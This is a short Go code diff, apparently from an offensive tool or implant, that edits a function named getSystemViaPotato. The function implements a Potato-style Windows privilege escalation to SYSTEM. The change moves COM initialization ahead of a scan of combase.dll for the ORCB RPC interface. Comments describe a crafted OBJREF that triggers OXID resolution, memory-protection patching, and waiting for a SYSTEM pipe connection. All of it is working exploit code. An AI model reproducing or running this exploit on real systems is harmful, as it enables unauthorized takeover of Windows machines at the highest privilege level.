@@ -159,7 +159,10 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		}
 	}
 
-	// Phase 1: Find combase.dll and scan for ORCB RPC interface
+	// Phase 1: Initialize COM (loads combase.dll) and scan for ORCB RPC interface
+	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
+	defer procCoUninitialize.Call()
+
 	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
 	if err != nil {
 		return structs.CommandResult{
@@ -297,11 +300,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
 	}()
 
-	// Phase 5: Initialize COM and trigger OXID resolution
-	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
-	defer procCoUninitialize.Call()
-
-	// Construct OBJREF manually and trigger CoUnmarshalInterface
+	// Phase 5: Trigger OXID resolution via crafted OBJREF
 	triggerErr := triggerOXIDResolution()
 
 	// Phase 6: Wait for pipe connection (SYSTEM connecting)
